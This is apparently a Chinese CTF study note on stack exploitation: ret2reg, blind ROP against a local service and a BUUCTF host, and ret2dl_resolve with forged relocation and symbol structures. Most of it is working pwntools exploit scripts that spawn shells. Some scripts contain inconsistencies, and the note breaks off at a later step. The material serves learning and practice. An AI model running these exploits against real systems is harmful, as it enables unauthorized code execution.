通过ROPGadget查找到call/jmp命令

```
ROPgadget --binary ret2reg --only "call|eax"
```

![image-20240406172014411](${images}/image-20240406172014411.png)



pyload

```
from pwn import *

# 1.使用pwntools自带的功能生成shellcode
shellcode = asm(shellcraft.sh())

# 2.call eax的地址
call_eax = p32(0x08049019)

# 3.构造payload
payload = flat([shellcode , b'a'* (0x20c - len(shellcode) ),call_eax])

# 4.启动进程传递参数
io = process(argv=[ "./ret2reg",payload])

# 5.获得交互式shell
io.interactive()
```



### 1、（7）BROP

[ctf-challenges/pwn/stackoverflow/brop/hctf2016-brop at master · ctf-wiki/ctf-challenges · GitHub](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop)

> 这里使用的是ubuntu系统运行这个文件，攻击的为kali
>
> 下载好brop文件后
>
> ```
> socat tcp-l:8888,fork exec:./brop
> ```
>
> ![image-20240406192740229](${images}/image-20240406192740229.png)



#### 首先试探是否存在栈溢出漏洞：

需要从1开始枚举

```python
from pwn import *
from pwn import p64

def getbufferflow_length():
    i = 1
    while 1:
        try:
            sh = remote('127.0.0.1', 8888)
            sh.recvuntil(b'WelCome my friend,Do you know password?\n')
            sh.send(i * b'a')
            output = sh.recv()
            sh.close()
            if not output.startswith(b'No password'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1
        
print(getbufferflow_length())
```

![image-20240406210513522](${images}/image-20240406210513522.png)

得到溢出长度为72，并且根据回显的信息得知，没有Canary保护，因为，如果有Canary保护就会有相应的报错内容，所以不需要执行stack reading。



#### 寻找stop gadgets

函数如下：

```python
def get_stop_addr(buf_size):
    addr = 0x400000
    while True:
        sleep(0.1)
        addr += 1
        payload  = b"A"*buf_size
        payload += p64(addr)
        try:
            p = remote('127.0.0.1', 8888)
            p.recvline()
            p.sendline(payload)
            p.recvline()
            p.close()
            log.info("stop address: 0x%x" % addr)
            return addr
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1
```

![image-20240406195604484](${images}/image-20240406195604484.png)

得到一个可能的地址0x400555，试了一下0x400555以后都行，但是下面的555不行，因此，应该设立一个双重循环，这个地址从0x400555开始，经实验6b6可行



#### 识别brop gadgets

但是下面的555不行，因此，应该设立一个双重循环，这个地址从0x400555开始，经实验6b6可行

构造如下，get_brop_gadget 是为了得到可能的 brop gadget，后面的 check_brop_gadget 是为了检查

```python
def get_brop_gadget(length, stop_gadget, addr):
    try:
        sh = remote('127.0.0.1', 8888)
        sh.recvuntil(b'password?\n')
        payload = b'a' * length + p64(addr) + p64(0) * 6 + p64(
            stop_gadget) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print(content)
        # stop gadget returns memory
        if not content.startswith(b'WelCome'):
            return False
        return True
    except Exception:
        sh.close()
        return False


def check_brop_gadget(length, addr):
    try:
        sh = remote('127.0.0.1', 8888)
        sh.recvuntil(b'password?\n')
        payload = b'a' * length + p64(addr) + b'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


##length = getbufferflow_length()
length = 72
##get_stop_addr(length)
stop_gadget = 0x4006b6
addr = 0x400740
while 1:
    print(hex(addr))
    if get_brop_gadget(length, stop_gadget, addr):
        print('possible brop gadget: 0x%x' % addr)
        if check_brop_gadget(length, addr):
            print('success brop gadget: 0x%x' % addr)
            break
    addr += 1
```

![image-20240406211300588](${images}/image-20240406211300588.png)

success brop gadget: 0x4007ba



#### 确定puts@plt地址

构造的payload如下：

```
payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

具体函数如下

```python
def get_puts_plt(length, rdi_ret, stop_gadget):
    addr = 0x400570
    while True:
        sleep(0.1)
        print(hex(addr))
        payload = b'A' * length + p64(rdi_ret) + p64(0x400000) +  p64(addr) + p64(stop_gadget)
        try:
            sh = remote('127.0.0.1', 8888)
            sh.recvuntil(b'WelCome my friend,Do you know password?\n')
            sh.sendline(payload)
            content = sh.recvline()
            print(content)
            if b'\x7fELF' in content:
                log.success('找到puts@plt addr:'+str(hex(addr)))
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1

get_puts_plt(offset,rdi_ret,stop_gadget)
```

![image-20240408223928193](${images}/image-20240408223928193.png)

![image-20240408223935965](${images}/image-20240408223935965.png)



#### 泄露puts@got地址

```python
def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 8888)
    payload = b'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget)
    sh.recvuntil(b'password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == b"":
            data = b'\x00'
        return data
    except Exception:
        sh.close()
        return None


##length = getbufferflow_length()
length = 72
##stop_gadget = get_stop_addr(length)
stop_gadget = 0x400555
##brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
addr = 0x400000
result = b""
while addr < 0x401000:
    print(hex(addr))
    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None:
        continue
    else:
        result += data
    addr += len(data)
with open('code', 'wb') as f:
    f.write(result)
```

![image-20240407180226219](${images}/image-20240407180226219.png)

可以看到，真正的puts@plt在0x400560处

#### 利用

```python
 找不到本地最新的
from LibcSearcher import LibcSearcher

##length = getbufferflow_length()
length = 72
##stop_gadget = get_stop_addr(length)
stop_gadget = 0x4005c0
##brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
##leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got = 0x601018

sh = remote('127.0.0.1', 8888)
# sh.recvuntil(b'WelCome my friend,Do you know password?\n')
payload = b'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(rdi_ret) + p64(stop_gadget)
sh.recvuntil(b'WelCome my friend,Do you know password?\n')
sh.sendline(payload)
puts_addr = u64(sh.recv().strip().ljust(8, b'\x00'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = b'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)
sh.sendline(payload)
sh.recvall()
sh.interactive()
sh.close()
```

找不到合适的libc



#### BUUCTF

可以写BUUCTF的BROP的在线环境

[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#axb_2019_brop64)

这是exp

```python
from pwn import *
from pwn import p64



def getbufferflow_length():
    i = 210
    while 1:
        try:
            p = remote("node5.buuoj.cn","29429")
            payload = b'a'*i
            p.sendlineafter("Please tell me:",payload)
            output = p.recvall()
            sleep(0.1)
            p.close()
            if b'Goodbye!' not in output:
                log.success("success offset : "+str(i))
                return i
            else:
                i += 1
        except EOFError:
            p.close()
            log.success("success offset : "+str(i))
            return i

# offset = getbufferflow_length()
offset = 216

def get_stop_addr(offset):
    addr = 0x4006e0
    while True:
        # sleep(0.1)
        addr += 1
        payload = b"A"*offset + p64(addr)
        try:
            p = remote("node5.buuoj.cn","29429")
            p.sendlineafter(b"Please tell me:",payload)
            data1 = p.recvline()
            print(data1)
            p.close()
            if b'Hello' in data1:
                log.info("stop address: 0x%x" % addr)
                return addr
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1

# get_stop_addr(offset)

def get_brop_gadget(length, stop_gadget):
    try:
        sh = remote("node5.buuoj.cn","29429")
        sh.recvuntil(b'Please tell me:')
        payload = b'a' * length + p64(addr) + p64(0) * 6 + p64(
            stop_gadget) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recvall()
        sh.close()
        # stop gadget returns memory
        if b'Hello' in content:
            log.success('找到一个返回值：'+str(hex(addr)))
            return addr
        else:
            addr += 1
    except Exception:
        sh.close()
        addr += 1

def check_brop_gadget(length, addr):
    try:
        sh = remote("node5.buuoj.cn","29429")
        sh.recvuntil(b'Please tell me:')
        payload = b'a' * length + p64(addr) + b'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recvline()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


length = 72
addr = 0x400900
stop_gadget = 0x4007d6
while 1:
    print(hex(addr))
    if get_brop_gadget(length, stop_gadget,addr):
        print('possible brop gadget: 0x%x' % addr)
        if check_brop_gadget(length, addr):
            print('success brop gadget: 0x%x' % addr)
            break
    addr += 1

# print(hex(get_brop_gadget(offset,stop_gadget)))
offset = 216
stop_gadget = 0x4007d6
brop_gadget = 0x40095a
rdi_ret = brop_gadget + 0x9

def get_puts_addr(offset,rdi_ret,stop_gadget):
    addr = 0x400630
    while True:
        print(hex(addr))
        p = remote("node5.buuoj.cn","29429")
        p.recvuntil(b'Please tell me:')
        payload = b'a' * offset + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
        p .sendline(payload)
        try:
            content = p.recvall()
            print(content)
            if b'\x7fELF' in content:
                log.success('找到puts@plt addr:'+str(hex(addr)))
                return addr
            p.close()
            addr += 1
        except Exception as e:
            p.close()
            addr += 1

# get_puts_addr(offset,rdi_ret,stop_gadget)
#610
#629
#635
# [+] 找到puts@plt addr:0x400635

def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote("node5.buuoj.cn","29429")
    payload = b'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget)
    sh.recvuntil(b'Please tell me:')
    sh.sendline(payload)
    sh.recvuntil(b'a'*offset)
    sh.recv(3)
    try:
        data = sh.recv(timeout=1)
        sleep(0.1)
        sh.close()
        try:
            data = data[:data.index(b"\nHello,I am a computer")]
            print(data)
        except Exception:
            data = data
        if data == b"":
            data = b'\x00'
        return data
    except Exception:
        sh.close()
        return None



offset = 216
stop_gadget = 0x4006e2
brop_gadget = 0x40095a
rdi_ret = brop_gadget + 0x9
puts_plt = 0x400640
addr = 0x400000
result = b""
# while addr < 0x401000:
#     print(hex(addr))
#     data = leak(offset, rdi_ret, puts_plt, addr, stop_gadget)
#     if data is None:
#         result += b'\x00'
#         addr += 1
#         continue
#     else:
#         result += data
#     addr += len(data)
# with open('code', 'wb') as f:
#     f.write(result)

#在0x400640处发现了got位置：0x601018
puts_got = 0x601018
from pwn import u64

from LibcSearcher import LibcSearcher

sh = remote("node5.buuoj.cn","29429")
sh.recvuntil(b'Please tell me:')
payload = b'a' * offset + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
    stop_gadget)
sh.sendline(payload)
sh.recvuntil(b'a'*offset)
sh.recv(3)
func_addr = sh.recv(6)
puts_addr = u64(func_addr.ljust(8,b'\x00'))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = b'a' * offset + p64(rdi_ret) + p64(binsh_addr) + p64(
    system_addr)
sh.sendline(payload)
sh.recv()
sh.interactive()
sh.close()
```



### 1、（8）ret2dl_resolve

[ret2dlresolve - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#64)



这里收集一下了：

#### 来自CTF Wiki的题：

##### Partial RELRO

###### **2015 年 xdctf 的 pwn200**

> 终极目标修改_dl_runtime_resolve参数，以达能直接运行我们想要的函数

> **由于只需要知道_dl_runtime_resolve函数的执行流程后，那么，是不是只需要此函数的第二个参数reloc_index就对应着一个函数，只需要控制对应地址的内容那么就可以控制解析的函数**
>
> 1. 控制程序执行_dl_runtime_resolve函数
>    				a、给定link_map和reloc_index两个参数
>       				b、或者给定plt0对应的汇编代码，在给个reloc_index即可
> 2. 控制reloc_index大小，方便指向伪造（控制的区域），伪造一个指定的重定位表项
> 3. 伪造重定位表项，使得重定位表项所指的符号也在自己控制范围内(即函数)
> 4. 伪造符号内容，从而使得符号对应的名称也在自己控制的范围内(即函数)	

[CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200/pwn200 at master · Cherishao/CTF-All-In-One · GitHub](https://github.com/Cherishao/CTF-All-In-One/blob/master/src/writeup/6.1.3_pwn_xdctf2015_pwn200/pwn200)



第一步、需要IDA查看栈

> 可以得知有个栈溢出的ROP，可以用作栈迁移

计算栈溢出所需大小

```
gdb main
cyclic 200
```

得到

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

```
run
```

输入得到的字符串，然后有个Invalid address

![image-20240315123154426](${images}/image-20240315123154426.png)

计算溢出大小

```
cyclic -l 0x62616164
```

![image-20240315123256667](${images}/image-20240315123256667.png)

得到大小是112



第二步、栈迁移

> 目的：将栈迁移到bss段控制write函数
>
> 1. 将栈迁移至bss段
> 2. 控制write函数输出相应的字符串



![image-20240315131405830](${images}/image-20240315131405830.png)

将save ebp的位置覆盖为bss段某处地址的fake ebp1，这样，执行read函数的时候会向fake epb1写0x100个字节，形成fake ebp2，当read函数执行结束后返回到leave_ret的gadget，执行leave_ret操作



leave指令相当与mov ebp,esp；pop ebp的操作，因此，leave完后会使得esp和ebp指向相同的位置，又因为

刚刚read函数向.bss写入0x100的字节的数据，那么此时，esp和ebp将会指向.bss段的fake ebp1处

![image-20240315132205540](${images}/image-20240315132205540.png)



然后执行pop ebp的操作，刚刚写入的数据使得esp刚刚的数据转变为fake ebp2，中有我们部署好的函数地址。

此时，ebp内数据被pop，esp输入，那么，ebp的值就为fake ebp2，且此时esp里会被减一，如果我们输入的数据中部署的函数的地址在第一字节处，那么esp就会指向我们刚刚部署好的函数地址，紧接着的ret指令就会执行(返回)[跳转]函数

![image-20240315132823187](${images}/image-20240315132823187.png)



第三步、控制write函数输出相应字符和栈布局

> 这里主要输出"/bin/sh"字符串，这样就能作为system函数的参数执行，此时因为我们的函数在.bss段，因此此时需要注意一点，.bss段的地址是由低向高地址扩散：
>
> ![image-20240315133145945](${images}/image-20240315133145945.png)

那么此时的代码为：

```python
from pwn import *

#这里是获取elf的相关信息
elf = ELF('main')
p = process('./main')
rop = ROP('./main') #方便实现ROP链

offset = 112  #这是之前得到的溢出所需的字节
bss_addr = elf.bss() #获取.bss段首地址

p.recvuntil(b'Welcome to XDCTF2015~!\n')

#1、栈迁移到.bss段

# 设置新栈的大小为0x800
stack_size = 0x800
# 设置栈的首地址
base_stage = bss_addr + stack_size
# 因为.bss段的特殊，所以由高向低写（也可能是错的）


# 填充缓冲区
rop.raw(b'a' * offset)
# 向新栈写入100字节
# rop.read()可以自动完成刚刚说的read函数，函数参数，返回地址的栈部署
# rop.call('read',[0,base_stage,0x100])
rop.read(0, base_stage, 0x100)

# 开始栈迁移
# 即设置 esp = base_stage
# rop.migrate(base_stage)会利用leave_ret自动完成部署迁移工作
rop.migrate(base_stage)
p.sendline(rop.chain())

#2、打印"/bin/sh"字符串
rop = ROP('./main')
sh = b"/bin/sh"

# rop.write()会自动完成write函数、函数参数、返回地址的栈部署,写入sh
# 这里的参数base_stage + n 的 n由下面的len(rop.chain())决定
# rop.call('write',[1, base_stage + 10, len(sh)])
rop.write(1, base_stage + 80, len(sh))

rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

# 发送此次利用链
p.sendline(rop.chain())
p.interactive()
```

成功输出/bin/sh

![image-20240315172432582](${images}/image-20240315172432582.png)

第四步、计算重定位索引即reloc_index

主要利用plt[0]中的push linkmap以及跳转到dl_resolve函数中解析指令来代替直接调用write函数的方式，现在在.bss新栈中模拟的部分就是下面红色框的部分，对.rel.plt进行迁移

![image-20240315175030809](${images}/image-20240315175030809.png)



那么此时我们需要在之前的基础上：

1. plt[0]的地址
2. write函数的重定位索引



用这两个替代直接调用write函数，plt[0]可以通过pwntools直接获取，但是write函数的reloc_index需要通过write_plt来计算。plt的每个结构体占16字节，可通过`readelf -x .plt main`查看：

![image-20240315175512403](${images}/image-20240315175512403.png)

.plt的结构体从1开始，对应着.rel.plt的0索引

由于.rel.plt的每个结构体大小为8个字节，所以得出在.rel.plt的第几个结构体后还需要乘以8，计算出函数在.rel.plt中的重定位索引。所以完整公式为write_index = [（write_plt - plt[0]）/16 - 1] * 8

![image-20240315175523270](${images}/image-20240315175523270.png)

这一部分在bss段中的新栈布局如下：

```
      低地址位 	
				+---------------------+
				|        plt0         |  <----ret
				+---------------------+
       			|      write_index    | write函数在.rel.plt的重定位索引
       			+---------------------+
       			|         bbbb        | write函数返回地址
       			+---------------------+
       			|          1          | write函数1参
       			+---------------------+
       			|      /bin/sh地址     | write函数2参，/bin/sh字符串所在地址
       			+---------------------+                 
       			|          7          | write函数3参     
       			+---------------------+                              
       			|        aaaa         |  填充           
       			|        ....         |  填充          
       			|        aaaa         |  填充            
       			+---------------------+                
       			|      /bin/sh        | /bin/sh字符串
       			+---------------------+ 
       			|        aaaa         |
       			|        ....         |              
       			|        aaaa         |           
      高地址位 	+---------------------+
```

**为什么在栈中部署plt[0]和write_plt就可以达到调用write函数的作用？**

这么布局其实是在模拟调用dl_runtime_resovle之前的过程，如果忘记了可以往前翻看一下。调用dl_runtime_resovle前的过程精简如下：

```
call  write@plt
jump  next addr
push  reloc_arg(dl_runtime_resovle的1参，也就是write_index)
jump --> 公共plt表项（plt0）
push  link_map
jump --> dl_runtime_resovle
```

栈中的plt0和write_index就是跳过了call的过程，在模拟push reloc_arg和jump 公共plt表项这两个步骤，接下来程序会顺着往下运行dl_runtime_resovle函数，从而起到和直接调用write函数一样的作用



此时的代码里应该：

1. 获取ptl[0]
2. 计算write_reloc_index

```
#获取plt[0]地址
plt0 = elf.get_section_by_name('.plt').header.sh_addr

#计算write函数的reloc_index
write_reloc_index = (elf.plt['write'] - plt0) / 16 - 1
write_reloc_index *= 8
rop.raw(plt0)
rop.raw(write_index)

#伪造write函数的ret addr
rop.raw('bbbb') #write函数的返回地址
rop.raw(1) #write函数的第一个参数
rop.raw(base_stage + 80) #write函数的第二个参数
rop.raw(len(sh)) #write函数的第三个参数
print("len:rop.chain():")
print(len(rop.chain()))#长度为n，所以可以在base_stage + n写上/bin/sh
rop.raw(sh)

rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
```



第五步、可以计算(.rel.plt + reloc_index)的计算，直接让程序指向write函数的Elf32_Rel结构体，也就是对结构体的迁移

![image-20240315182237453](${images}/image-20240315182237453.png)



构建结构体成员

在新栈中，ret位是plt0的话，那么就需要一个地址将流程指向需要伪造的write_Elf32_Rel结构体，这个地址先放着，先了解write函数在.rel.plt的结构题的构造：

```C
typedef struct{
  Elf32_Addr r_offset;
  Elf32_Word r_info;
}Elf32_Rel
```



可以看到，我们需要模拟两个变量，

1. r_offset
2. r_info

r_offset可通过pwntools的elf模块自动获取，即write函数在got表中的偏移"write_got = elf.got['write']"。另外一个通过readelf来查看

```
readelf -a main
```

![image-20240315182731755](${images}/image-20240315182731755.png)

找到这里，Info就是，offset也有



那么结构题内容找完整了，接下来需要在bss段新栈上让程序运行到构建的结构体，参照_dl_runtime_resolve：

通过.rel.plt + reloc_index找到函数对应的结构题，也就相当于一个基地址+相对基地址的偏移去找结构体。

那么在bss段上的新栈里部署了plt0，代替函数调用功能，那么接下来就会执行_dl_runtime_resovle函数。

运行_dl_runtime_resovle函数就会指向.rel.plt+reloc_index，基地址还是.rel.plt，但偏移变了而已。

又因为_dl_runtime_resovle函数没有做边界检查，那么偏移可到任意指定位置（程序领空）

例子：

![image-20240315183415290](${images}/image-20240315183415290.png)

也就是，本来正常会访问到正常的write函数结构题，但通过修改偏移，那么就可以访问到伪造的了

运行流程会指向bss段内新建栈中的伪造write函数结构体，暂定指向伪造write函数结构体的偏移为index_offset



那么就有个等式：.rel.plt + index_offset = base_stage（新栈基地址）+ 伪造函数结构体存放位置偏移。那么真正需要的就是index_offset，相当于伪造的_dl_runtime_resovle函数的第二参数，从而指向构建的write函数的结构体



因此，等式变换：index_offset = base_stage + 伪造函数结构体存放位置偏移 - .rel.plt



那么这个式子还有个未知数：伪造函数结构体存放位置偏移

也就是说我们把伪造的函数结构体放在了新栈的哪个位置，这个就需要在栈布局的时候考虑到。我们在stage2的栈中使用了很多的“a”进行填充，那么结构体就可以放在一堆“a”中



```
      低地址位 	
		    +---------------------+
	  0x00  |        plt0         |  <----ret
			+---------------------+
      0x04  |    index_offset     | 伪造的偏移
       	    +---------------------+
      0x08  |        bbbb         | write函数返回地址
       		+---------------------+
      0x0c  |          1          | write函数1参
       		+---------------------+
      0x10  |     /bin/sh地址      | write函数2参，/bin/sh字符串所在地址
       		+---------------------+                 
      0x14  |          7          | write函数3参     
       		+---------------------+   
      0x18  |      r_offset       | 伪造的结构体成员变量r_offset
            +---------------------+
      0x1c  |       r_info        | 伪造的结构体成员变量r_info
            +---------------------+
       		|        aaaa         |  填充           
       		|        ....         |  填充          
       		|        aaaa         |  填充            
       		+---------------------+                
      0x50	|      /bin/sh        | /bin/sh字符串
       		+---------------------+ 
       		|        aaaa         |
       		|        ....         |              
       		|        aaaa         |           
   高地址位  +---------------------+

```



那么，由于是32位程序，因此每行都是四字节，那么结构体放在从0x14到0x50中间任何位置都行，因为都是使用“a”来填充的，不会对执行流程有影响，那么这里就写在了写在了0x18和0x1c的位置

那么伪造的结构题相对基地址的位移就是0x18，也就是24字节

那么：



index_offset = base_stage + 32 - .rel.plt



其中，.rel.plt的基地址可通过pwntools的ROP模块自动获取



那么此时代码：

```C
#获取.rel.plt地址
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr

#那么在base_stage + 24的位置存放伪造结构体，并计算index_offset
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x507
 
#计算write函数的reloc_index
write_reloc_index = (elf.plt['write'] - plt0) / 16 - 1
#因为索引不能为float，那么修改成int即可
write_reloc_index = int(write_reloc_index) * 8




rop.raw(plt0)
#rop.raw(write_reloc_index)
rop.raw(index_offset)

#伪造write函数的ret addr
rop.raw('bbbb') #write函数的返回地址
rop.raw(1) #write函数的第一个参数
rop.raw(base_stage + 80) #write函数的第二个参数
rop.raw(len(sh)) #write函数的第三个参数
rop.raw(write_got)
rop.raw(r_info)
# rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
#print rop.dump()可查看栈布局


# 发送此次利用链
p.sendline(rop.chain())
p.interactive()
```



第六步、还是构建结构体，计算的r_info方式改变一下，通过.dynsym计算，也就是对,dynsym进行迁移，模拟的是：

![image-20240315190512284](${images}/image-20240315190512284.png)



对.dynsym的迁移和地址对齐

在迁移之前需要知道write函数在.dynsym中的结构体：

```C
typedef struct
{
  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移
  Elf32_Addr    st_value;
  Elf32_Word    st_size;
  unsigned char st_info; //对于导入函数符号而言，它是0x12
  unsigned char st_other;
  Elf32_Section st_shndx;
}Elf32_Sym; //对于导入函数符号而言，除st_name外其他字段都是0

```



也就是write函数的结构体内容大致为“[偏移 , 0 , 0 , 0x12]”

定位write函数结构体：

```
readeif -a main
```

![image-20240315190954271](${images}/image-20240315190954271.png)

可以看到结构体的下标为 5，那么使用readelf -x .dynsym main查看.dynsym中的数据（第六行，因为下标从0开始）

![image-20240315191142703](${images}/image-20240315191142703.png)



那么write函数在.dynsym中的结构体内容为(小端序)：

```
fake_write_sym = flat([0x54,0,0,0x12])
```

![image-20240315191353449](${images}/image-20240315191353449.png)



那么知道结构体内容了之后，现在需要考虑的还有将这个结构体放在哪里，在上一步的时候已经将write_rel_plt的结构体放在了0x18和0x1c的位置。那么fake_write_sym就可以紧接着放在0x20的位置，也就是相对与新栈基地址base_stage偏移32字节处开始部署



但在开始部署之前，需要**地址对齐**，因为打算在base_stage + 32处的位置不是write_sym结构体，那么找的位置就可能相对于.dynsym来说不是一个标准地址。什么是**标准地址**？.dynsym的每个结构体都是16个字节大小，也就是如果想找到某个函数的.dynsym结构体，那么就需要16个字节16个字节的找：此时有个公式：

```
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
```



例子：例子来自NoOne大佬，帖子开头有大佬博客

```
0x8048a00 11111111 22222222 33333333 44444444 dynsym起始位置
0x8048a10 11111111 22222222 33333333 44444444
0x8048a20 11111111 22222222 33333333 44444444
0x8048a30 11111111 22222222 33333333 44444444
0x8048a40 11111111 22222222 33333333 44444444
0x8048a50 11111111 22222222 33333333 44444444
0x8048a60 11111111 22222222 33333333 44444444
0x8048a70 11111111 22222222 33333333 44444444
0x8048a80 11111111 22222222 33333333 44444444
```



base_stage + 32 可能在这四个部分的任意位置，但不可以这样，结构体只能从开头开始，那么就需要取得这段开头地址

- 如果我在第三部分，第一个3的位置，那么base_stage + 32就是0x8048a88
- 利用上面的计算方式就得0x10 - ((0x8048a88 - 0x8048a00) & 0xf) = 0x10 - 0x8 = 0x8
- 则地址加上align之后 就是0x8048a90刚好对齐了



通过.dynsym结构体下标反推r_info

嘿嘿，还记得之前_dl_runtime_resolve运行过程的r_info右移8位去掉"07"标识即为函数在.dynsym中的下标，那么反之，得到了.dynsym的下标，在左移8位回去与上0x07不就可以得到r_info了吗



因此对齐之后，考虑新栈中.dynsym结构体相对于.dynsym的基地址是第几个结构体，因为.dynsym每个结构体大小为16字节，因此新栈结构体地址fake_sym_addr - .dynsym基地址得到距离，距离有几个结构体，那么除以16即可(.dynsym基地址可通过pwntools自动获取)：

```
index_dynsym = (fake_sym_addr - .dynsym) / 0x10
```

在得到.dynsym下标之后，左移8，再与上0x7就彳亍了：

```
r_info = (index_dynsym << 8) | 0x7
```

最后将构造了.rel.plt的结构体放在base_stage + 24的地方，部署的方式和前面的步骤一样，通过公式：

index_offset = base_stage + 24 - .rel.plt算出偏移指向构建的.rel.plt的结构体的位置

最后，这步栈的布局如下：

```
      低地址位 	
		    +---------------------+
	  0x00  |        plt0         |  <----ret
			+---------------------+
      0x04  |    index_offset     | 伪造的.rel.plt的结构体偏移
       	    +---------------------+
      0x08  |        bbbb         | write函数返回地址
       		+---------------------+
      0x0c  |          1          | write函数1参
       		+---------------------+
      0x10  |     /bin/sh地址      | write函数2参，/bin/sh字符串所在地址
       		+---------------------+                 
      0x14  |          7          | write函数3参     
       		+---------------------+   
      0x18  |      r_offset       | 伪造的.rel.plt的结构体成员变量r_offset
            +---------------------+
      0x1c  |       r_info        | 伪造的.rel.plt的结构体成员变量r_info
            +---------------------+
      0x20  |        aaaa         |  对齐
       		+---------------------+
      0x24  |        aaaa         |  对齐
       		+---------------------+
      0x28  |       st_name       |  伪造的.dynsym的结构体的成员变量st_name
      		+---------------------+
      0x2c  |       st_value      |  伪造的.dynsym的结构体的成员变量st_value
      		+---------------------+
      0x30  |       st_size       |  伪造的.dynsym的结构体的成员变量st_size
      		+---------------------+
      0x34  |       st_info       |  伪造的.dynsym的结构体的成员变量st_info
       		+---------------------+           
       		|        aaaa         |  填充 
       		|        ....         |  填充          
       		|        aaaa         |  填充            
       		+---------------------+                
      0x50	|      /bin/sh        | /bin/sh字符串
       		+---------------------+ 
       		|        aaaa         |
       		|        ....         |              
       		|        aaaa         |           
   高地址位  +---------------------+

```

此步exp

```
plt0 = elf.get_section_by_name('.plt').header.sh_addr
#获取.rel.plt地址
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
#获取.dynsym的基地址
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr

#在base_stage + 32的地方开始部署.dynsym结构体
fake_sym_addr = base_stage + 32
#对齐
Align = 0x10 - ((fake_sym_addr - dynsym) & 0xf )
fake_sym_addr = fake_sym_addr + Align
fake_write_sym = flat([0x54,0,0,0x12]) #伪造的.dynsym结构体
#计算.dynsym结构体下标
index_dynsym = int((fake_sym_addr - dynsym) / 0x10)

#在base_stage+24的位置开始部署.rel.plt的结构体

#那么在base_stage + 24的位置存放伪造结构体，并计算index_offset
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']

#由.dynsym下标反推r_info
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got,r_info])

#r_info = 0x507
 
#计算write函数的reloc_index
write_reloc_index = (elf.plt['write'] - plt0) / 16 - 1
#因为索引不能为float，那么修改成int即可
write_reloc_index = int(write_reloc_index) * 8




rop.raw(plt0)
#rop.raw(write_reloc_index)
rop.raw(index_offset)

#伪造write函数的ret addr
rop.raw('bbbb') #write函数的返回地址
rop.raw(1) #write函数的第一个参数
rop.raw(base_stage + 80) #write函数的第二个参数
rop.raw(len(sh)) #write函数的第三个参数
rop.raw(fake_write_reloc) #伪造的.rel.plt的结构体
rop.raw('a' * Align) #对齐
rop.raw(fake_write_sym) #伪造的.dynsym的结构体
#rop.raw(write_got)
#rop.raw(r_info)
# rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
#print(rop.dump())#可查看栈布局
```

最后

![image-20240315195357679](${images}/image-20240315195357679.png)



第七步、上一步完成了.dynsym的迁移工作，这次在上一次的基础上继续将.dynstr迁移到bss段的新栈中，就是模拟红圈部分：

